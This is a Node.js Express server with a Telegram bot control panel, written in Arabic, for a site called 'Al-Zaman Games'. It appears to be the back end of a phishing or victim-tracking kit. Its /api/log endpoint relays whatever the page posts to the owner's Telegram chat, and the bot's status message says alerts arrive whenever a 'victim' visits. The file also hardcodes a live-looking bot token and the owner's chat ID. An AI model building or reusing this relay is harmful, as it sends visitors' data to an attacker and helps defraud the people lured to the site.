const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const app = express();

const token = '8741320185:AAE2Y5Xv70PJWm4k-GMUO6FYub07wozYI2A'; 
const bot = new TelegramBot(token, { polling: true });
const myId = '8305841557';

app.use(express.json());
app.use(express.static(__dirname));

let siteConfig = { ad: { image: "" } };

// تشغيل الواجهة
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/api/config', (req, res) => {
    res.json(siteConfig);
});

app.post('/api/log', (req, res) => {
    const { message } = req.body;
    bot.sendMessage(myId, message);
    res.sendStatus(200);
});

// لوحة التحكم عند إرسال /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId === myId) {
        const opts = {
            reply_markup: {
                keyboard: [
                    ['📊 إحصائيات الموقع', '🖼️ تغيير الإعلان'],
                    ['⚙️ إعدادات أخرى', '🔄 إعادة تشغيل النظام']
                ],
                resize_keyboard: true
            }
        };
        bot.sendMessage(chatId, "🛠️ أهلاً بك في لوحة تحكم نظام ألعاب الزمان\n\nاختر من القائمة بالأسفل أو أرسل صورة مباشرة لتغيير الإعلان:", opts);
    } else {
        bot.sendMessage(chatId, "عذراً، هذا البوت مخصص لمدير النظام فقط.");
    }
});

// استقبال الصور لتحديث الإعلان
bot.on('photo', async (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId === myId) {
        const photo = msg.photo[msg.photo.length - 1];
        const fileLink = await bot.getFileLink(photo.file_id);
        siteConfig.ad.image = fileLink;
        bot.sendMessage(chatId, "✅ تم تحديث صورة الإعلان في الموقع فوراً!");
    }
});

// معالجة أزرار القائمة
bot.on('message', (msg) => {
    if (msg.text === '📊 إحصائيات الموقع') {
        bot.sendMessage(myId, "📈 النظام يعمل بشكل مستقر وتصلك الإشعارات عند دخول أي ضحية.");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`Server is running on port ${PORT}`); });
